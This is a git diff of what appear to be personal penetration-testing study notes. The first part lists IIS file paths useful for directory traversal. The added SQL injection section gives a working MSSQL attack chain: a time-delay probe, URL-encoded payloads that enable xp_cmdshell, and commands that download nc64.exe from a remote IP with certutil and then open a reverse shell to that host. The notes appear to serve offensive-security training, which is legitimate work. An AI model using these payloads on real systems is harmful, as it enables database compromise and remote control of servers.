@@ -165,9 +165,10 @@ Let's briefly examine directory traversal attacks on Windows. On Windows, we can
 
 To identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.
 
-Once we gather information about the running application or service, we can research paths leading to sensitive files. if we learn that a target system is running the Internet Information Services (IIS)5 web server, logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. Another file we should always
-
-Check when the target is running an IIS web server is C:\inetpub\wwwroot\web.config, which may contain sensitive information like passwords or usernames.
+Once we gather information about the running application or service, we can research paths leading to sensitive files.
+if we learn that a target system is running the Internet Information Services (IIS)5 web server, logs are located at C:\inetpub\logs\LogFiles\W3SVC1\.
+Another file we should always check when the target is running an IIS web server is
+C:\inetpub\wwwroot\web.config, which may contain sensitive information like passwords or usernames.
 
 Local file Inclusions
 
@@ -175,7 +176,50 @@ File upload vulnerability
 
 OS Command Injection:
 
-SQL Injection
+Cross-Site Scripting:
+
+SQL Injection:
+
+Testing sqli in every input field
+
+```';#---```
+
+Reference page
+
+```https://github.com/swisskyrepo/PayloadsAllTheThings```
+
+MSSQL injection:
+
+Exploit: https://gist.github.com/s0j0hn/ba2163e3f094b419c1d4480ae5dc9a66
+
+Manual exploit:
+
+Syntax: -' => ERROR RETURN
+
+Check 10s delay: ';WAITFOR DELAY '0:0:10'--
+
+Since cmdshell is turned off by default first we need to turn it on:
+
+'+EXEC+sp_configure+'show+advanced+options',1%3b+-- 
+
+'+RECONFIGURE%3b+-- 
+
+'+EXEC+sp_configure+'xp_cmdshell',1%3b+-- 
+
+'+RECONFIGURE%3b+-
+
+Get the shell:
+
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.226/nc64.exe c:/windows/temp/nc64.exe";--
+
+';EXEC xp_cmdshell  "c:/windows/temp/nc64.exe 192.168.45.226 443 -e cmd.exe";--
+
+
+
+
+
+
+
 
 
 
